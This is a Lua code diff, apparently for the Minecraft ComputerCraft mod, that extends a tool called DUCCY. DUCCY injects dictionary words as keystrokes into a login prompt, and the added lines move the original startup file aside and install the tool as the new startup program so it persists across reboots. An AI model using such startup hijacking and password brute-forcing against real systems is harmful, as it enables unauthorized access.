@@ -1,3 +1,13 @@
+--[[
+
+	Created by Dave-ee Jones
+	
+	Injects keystrokes into a read() function called on a login screen.
+	WARNING:
+	This program automatically moves the old startup file to "/.startup", which gets called on by DUCCY (which is now "/startup").
+
+--]]
+
 -- Word dictionary
 local tDictionary = {
 	"pass",
@@ -10,6 +20,27 @@ local tDictionary = {
 local nTime = 0
 local nIndex = 1
 local bRunning = true
+
+-- Setup environment
+local prog = shell.getRunningProgram()
+if prog == "startup" then
+	if fs.exists("/.duccy") then
+		local file = fs.open("/.duccy","r")
+		fs.delete(file.readLine())
+		file.close()
+		fs.delete("/.duccy")
+		os.reboot()
+	end
+else
+	if fs.exists("/startup") then
+		fs.move("/startup","/.startup")
+	end
+	local file = fs.open("/.duccy","w")
+	file.writeLine("/"..prog)
+	file.close()
+	fs.copy("/"..prog,"/startup")
+	os.reboot()
+end
 
 -- Injection, runs in parallel with the start program
 local function inject()
@@ -39,7 +70,7 @@ local function run()
 			print("Access denied.")
 		end
 	end--]]
-	shell.run("_startup")
+	shell.run("/.startup")
 end
 
 -- The coroutines
